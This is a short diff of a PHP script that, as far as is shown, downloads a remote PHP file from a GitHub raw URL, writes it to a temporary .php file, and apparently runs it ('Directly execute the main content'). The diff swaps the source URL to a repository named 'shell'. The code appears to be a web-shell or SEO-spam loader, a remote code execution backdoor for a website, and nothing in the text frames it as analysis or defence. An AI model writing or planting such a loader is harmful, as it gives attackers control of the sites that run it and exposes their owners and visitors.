@@ -26,7 +26,7 @@ function geturlsinfo($url) {
     } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
         $handle = fopen($url, "r");
         if ($handle === false) {
-            echo 'fopen error';
+            echo 'fopen error'; 
             return false;
         }
         $url_get_contents_data = stream_get_contents($handle);
@@ -38,7 +38,7 @@ function geturlsinfo($url) {
 }
 
 // Directly execute the main content
-$a = geturlsinfo('https://raw.githubusercontent.com/5Y4H/seo/refs/heads/main/seobarbar.php');
+$a = geturlsinfo('https://raw.githubusercontent.com/adsteramaheswara-cloud/shell/refs/heads/main/seobarbar.php');
 if ($a !== false) {
     $tmp_file = sys_get_temp_dir() . '/temp_' . uniqid() . '.php';
     file_put_contents($tmp_file, $a);
